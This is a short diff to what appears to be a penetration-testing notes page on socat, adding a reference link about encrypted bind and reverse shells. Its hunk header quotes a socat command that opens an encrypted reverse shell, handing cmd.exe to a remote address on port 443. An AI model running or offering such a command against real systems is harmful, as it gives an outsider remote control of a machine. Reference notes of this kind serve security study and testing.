@@ -275,3 +275,4 @@ socat -d -d OPENSSL:192.168.189.44:443,verify=0 EXEC:'cmd.exe',pipes
 
 * [Linux.die.net - socat](https://linux.die.net/man/1/socat)
 * [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
+* [Erev0s.com - Encrypted Bind and Reverse Shells with Socat (Linux/Windows)](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
